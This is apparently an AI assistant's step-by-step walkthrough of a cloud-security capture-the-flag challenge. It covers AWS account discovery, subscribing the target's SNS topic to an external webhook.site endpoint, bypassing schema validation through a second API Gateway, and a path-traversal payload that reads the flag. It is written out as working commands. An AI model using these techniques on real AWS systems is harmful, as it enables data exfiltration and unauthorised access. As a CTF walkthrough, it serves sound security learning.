Since you've already found a public writeup, the fastest path is to verify where you are in the chain and execute the remaining steps.

### 1. Discover the correct AWS account ID

The account ID is intentionally omitted from:

```ini
[profile role]
role_arn = arn:aws:iam:::role/user-role
```

Run:

```bash
python3 -m s3recon.cli \
  --role arn:aws:iam::000000000000:role/user-role \
  --bucket wiz-birthday-s3-party/index.html
```

(or the exact command from the challenge materials)

The output should reveal:

```text
Account ID: XXXXXXXXXXXX
```

Save that value as:

```bash
export TARGET_ACCT=XXXXXXXXXXXX
```

---

### 2. Subscribe to the SNS topic

Use the **base user credentials**, not the assumed role.

Verify identity:

```bash
aws sts get-caller-identity
```

You should see:

```text
arn:aws:iam::<your_ctf_account>:user/user
```

Create a webhook at:

```text
https://webhook.site
```

Then subscribe:

```bash
aws sns subscribe \
  --topic-arn arn:aws:sns:us-east-1:$TARGET_ACCT:BirthdayPartyInvites \
  --protocol https \
  --notification-endpoint "https://webhook.site/<UUID>?x=@cloudsecuritychampionship.com"
```

Expected:

```json
{
  "SubscriptionArn": "pending confirmation"
}
```

---

### 3. Confirm the SNS subscription

Watch the webhook.site page.

SNS will send a confirmation request containing a URL.

Open the URL.

After confirmation the subscription becomes active.

---

### 4. Generate an invitation token

Call the generate endpoint:

```bash
curl -s \
  -X POST \
  https://<APIGW-1>/prod/generate \
  -H "Content-Type: application/json" \
  -d '{"email":"test@cloudsecuritychampionship.com"}'
```

The webhook should receive an SNS notification containing something similar to:

```json
{
  "token":"...",
  "registration_url":"..."
}
```

Save the token.

---

### 5. Abuse the second API Gateway

The writeup indicates there are **two API Gateways**:

| Gateway | Validation                |
| ------- | ------------------------- |
| APIGW-1 | Request schema validation |
| APIGW-2 | No validation             |

You need the endpoint that fronts the same Lambda without schema validation.

If you have the downloaded ZIP, look for:

```yaml
AWS::ApiGateway
```

or

```json
execute-api
```

references to find the second gateway hostname.

---

### 6. Trigger the path traversal

Use the token from SNS:

```bash
curl -s \
  -X POST \
  https://<APIGW-2>/prod/register \
  -H "Content-Type: application/json" \
  -d '{
        "token":"TOKEN_HERE",
        "template":"/flag",
        "name":"test"
      }'
```

Expected:

```json
{
  "status":"success",
  "card_url":"https://wiz-birthday-s3-party.s3.amazonaws.com/cards/UUID.html"
}
```

---

### 7. Retrieve the flag

```bash
curl https://wiz-birthday-s3-party.s3.amazonaws.com/cards/UUID.html
```

The flag should be embedded in the generated birthday card.

---

If you're stuck on a specific step, paste:

```bash
aws sts get-caller-identity
```

and the output from:

```bash
python3 -m s3recon.cli ...
```

and I can help determine exactly where the chain is failing.
